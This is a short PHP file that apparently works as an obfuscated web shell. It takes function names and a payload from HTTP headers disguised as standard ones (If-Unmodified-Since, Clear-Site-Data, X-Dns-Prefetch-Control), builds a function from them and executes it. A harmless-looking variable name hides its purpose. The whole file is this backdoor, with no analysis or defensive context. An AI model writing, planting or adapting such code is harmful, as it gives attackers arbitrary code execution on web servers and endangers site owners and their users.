<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $db2_convert = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Clear-Site-Data']($_HEADERS['X-Dns-Prefetch-Control']));
    $db2_convert();
}